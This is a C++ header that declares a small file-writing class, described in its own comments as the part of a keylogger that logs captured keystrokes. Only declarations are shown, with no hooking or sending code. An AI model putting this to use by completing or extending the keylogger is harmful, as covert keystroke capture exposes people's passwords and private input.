#pragma once

/**
 * Standart headers: c++/os
 */
#include <fstream>
#include <string>

/**
 * @class Class for writing hooked by keylogger keys.
 * NoCopyable, NoMovable, NoCopyAssignable, NoMoveAssignable
 */
class write_file
{
private:
    std::ofstream ofsasdswd;
    std::ofstream out;

public:
    /**
     * @brief Default Constructor
     */
    write_file();

    /**
     * @brief Parametrized Constructor with filename for write
     */
    write_file( const std::string& filename );

    /**
     * @brief Destructor
     */
    ~write_file();

    /**
     * @brief NoCopyConstructible
     */
    write_file( const write_file& ) = delete;

    /**
     * @brief NoMoveConstructible
     */
    write_file( write_file&& ) = delete;

    /**
     * @brief NoCopyAssignable
     */
    write_file& operator=( const write_file& ) = delete;

    /**
     * @brief NoMoveAssignable
     */
    write_file& operator=( write_file&& ) = delete;

    /**
     * @brief Write hooked key to log file
     * @param str_to_file string which will be written
     */
    void write( const std::wstring& str_to_file );

};
